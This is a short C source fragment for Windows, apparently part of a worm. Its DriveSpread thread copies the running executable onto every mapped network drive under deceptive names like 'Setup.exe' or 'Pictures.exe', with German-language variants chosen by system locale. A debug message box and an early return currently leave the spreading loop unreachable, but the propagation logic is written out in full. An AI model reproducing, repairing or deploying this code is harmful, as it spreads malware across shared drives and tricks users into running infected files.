   DWORD WINAPI DriveSpread(LPVOID)
   {
       char DriveLetter[2];
       char Buffer[MAX_PATH];
       char WormFile[MAX_PATH];
       char *FileNameEn[] ={
                               "Install",
                               "Archive",
                               "Setup",
                               "Selfextracting",
                               "Pictures",
                               "Images"
                           };
       char *FileNameDe[] ={
                               "Installation",
                               "Archiv",
                               "Setup_DE",
                               "Selbstextrahierend",
                               "Bilder",
                               "Zeichnungen"
                           };

       GetModuleFileName(0, WormFile, sizeof(WormFile));
   MessageBox(0, "thread", 0, 0);
   return 0;
       for(int d = 66; d < 91; d++) //b - z
       {
           DriveLetter[0] = d;
           DriveLetter[1] = 0;

           lstrcpy(Buffer, DriveLetter);
           lstrcat(Buffer, ":\\");

           if(GetDriveType(Buffer) == DRIVE_REMOTE)
           {
               if(GermanLang() == true)
               {
                   lstrcat(Buffer, FileNameDe[RandomNumber(6)]);
               }
               else
               {
                   lstrcat(Buffer, FileNameEn[RandomNumber(6)]);
               }

               lstrcat(Buffer, ".exe");

               CopyFile(WormFile, Buffer, false);
           }
       }

       return 0;
   }
